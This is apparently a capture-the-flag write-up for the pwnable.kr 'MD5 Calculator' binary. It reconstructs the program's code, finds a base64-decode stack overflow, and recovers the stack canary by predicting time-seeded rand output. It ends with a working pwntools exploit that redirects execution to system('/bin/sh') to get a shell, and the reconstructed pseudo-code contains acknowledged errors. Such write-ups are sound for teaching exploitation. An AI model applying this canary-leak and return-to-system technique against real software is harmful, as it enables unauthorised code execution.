#  MD5 Calculator

I dont have `IDA` pro, which makes me really sad.

Lets dive into `process_hash`.

After a long session of `IDA`ing, I figured out that the code looks something like this:

`process_hash` psuedo-code:
```c
char g_buf[1024]; 

int32_t process_hash() {
    char arr[512] = {0};
    fflush(stdin);
    
    memset(g_buf, 0, 1024);
    fgets(stdin, 1024, g_buf);

    memset(arr, 0, 512); /* might be uneeded */

    int length = Base64Decode(arr, g_buf);

    char *md5str = calc_md5(arr, length);
    printf("MD5(data) : %s\n", md5str);
    free(md5str);

    stack_check(); /* This nasty guy! */
}
```

`Base64Decode` psuedo-code:
```c
int32_t Base64Decode(char *dest, char* src) {
    int32_t length = CalcDecodeLength(src);
    FILE *src_stream = fmemopen(src, strlen(src), "r");
    BIO *b64 = BIO_new(BIO_f_base64());
    BIO *bio = BIO_new_fp(src_stream, 0);
    
    bio = BIO_push(b64, bio); /* Is the assignment here right? */ 
    BIO_set_flags(bio, 0x100);
    int amount_read = BIO_read(bio, dest, strlen(src));
    dest[amount_read] = '\0';
    BIO_free_all(bio);
    fclose(src_stream)
    return length;
}
```

`CalcDecodeLength` psuedo-code:
```c
int32_t CalcDecodeLength(char *encoded) {
    int32_t len = strlen(encoded);
    int32_t padding = 0;

    if('=' == encoded[len - 1]) {
        padding = 1;
        if('=' == endcoded[len - 2]) {
            padding = 2;
        }
    }

    /* All FPU registers are 80bit wide */
    float80_t decode_len = 0.75 * (float80_t)len - (float80_t)padding;
    return (int32_t)decode_len;
}
```

`calc_md5` psuedo-code:
```c
int32_t calc_md5(char *arr, int len) {
    char digest[16];
    char *arr_view = arr;
    MD5_CTX md5ctx;
    char *ret_buf = malloc(33);


    while(len > 0) {
        /* Process block by block */
        if(len <= 512) {
            MD5_Update(md5ctx, arr_view, length);
        }
        else {
            MD5_Update(md5ctx, arr_view, 512);
        }

        length -= 512;
        arr_view += 512;
    }

    MD5_Final(&digest, &md5ctx);
    
    for(int i = 0; i < 16; ++i) {
        snprintf(ret_buf + 2*i, 32, "%02x", digest[i]);
    }

    return ret_buf;
}
```

Whats interesting here is that a decoding of a `1024` bytes long `base64` encoded buffer can be about `1024*0.75 == 768` bytes long, which is way more than the `512` bytes long array used to hold the result.

But, we have a stack canary. There are a few possible ways to attack this problem, when the easiest one is to look for an information leak.

I initially wanted to ignore this function, but I guess its there for a reason:

```c
int32_t my_hash() {
    int32_t arr[8];
    int32_t *p = arr;
    int32_t ret = 0;

    for(int32_t i = 0; i < 8; ++i) {
        arr[i] = rand();
    }

    ret += (arr[1] + arr[5]);
    ret += (arr[2] - arr[3]);
    ret += (arr[7] + arr[8]); /* ??? */
    ret += (arr[4] - arr[6])
    
    return ret;
}
```

Wtf? There seems to be an access to `arr[8]`, but the array is only `32` bytes long... which means this is the canary! We got the information leak we needed.

But theres a catch. `rand` is seeded with `time(NULL)` on the `pwnable.kr` machine, so to predict its output, we need to sit on that machine, and be able to process the hash in less than a second (since `time` is precise to the second).

From playing with `gdb`, I get that to overrite the saved `eip` in `process_hash`, I need an offset of `528` bytes, and then the new address.

Now's a good time to try the new trick I've learnt:

```bash
fd@prowl:/tmp/dir$ pwn checksec hash
[*] '/tmp/dir/hash'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

Well, as we can see, `NX` is enabled, so we cant just `ret` to our shellcode. Unfortunate. But atleast theres no `pie`, so we can use constant addresses.

Digging in a bit deeper, we see that we can call `system`, which is at `0x8048880`, which we can direct the flow to. We just need to make sure its called with `/bin/sh`, so we can get a shell, but thats no problem, since we can just put it on our global buffer!

So we have something along these lines (but we need to make sure we run it from the `pwnable.kr` server):

For computing the canary, we have the `get_canary` snippet:
```c
#include <stdio.h>
#include <stdlib.h>
#include <time.h>

int main(int argc, char const *argv[])
{
    srand(time(NULL));

    if(argc < 2) {
        return 1;
    }

    int captcha = atoi(argv[1]);
    int canary;
    int arr[8];

    for(int i = 0; i < 8; ++i) {
        arr[i] = rand();
    }

    canary = captcha;
    canary -= (arr[1] + arr[5]);
    canary -= (arr[2] - arr[3]);
    canary -= arr[7];
    canary -= (arr[4] - arr[6]);

    printf("%x\n", canary);
    return 0;
}
```

And for the actual exploitation:
```python
from pwn import *

SYSTEM = 0x8048880
G_ENCODED_ADDR = 0x0804b0e0
ENCODED_PAYLOAD_LEN = 720

conn = remote('localhost', 9002)

conn.recvuntil(' : ')
captcha = conn.readline().strip()

print '[+] captcha: {}'.format(captcha)

proc = process(['./get_canary', captcha])

canary = int(proc.readall().strip(), 16)

print '[+] canary: {}'.format(canary)

conn.sendline(captcha)
conn.recvuntil('paste me!\n')

payload = b64e('A'*512 + p32(canary) + 'A'*12 + p32(SYSTEM) + "A"*4 + p32(G_ENCODED_ADDR + ENCODED_PAYLOAD_LEN)) + '/bin/sh\x00'
print payload

conn.sendline(payload)

conn.interactive()
```

And thats how we do it.
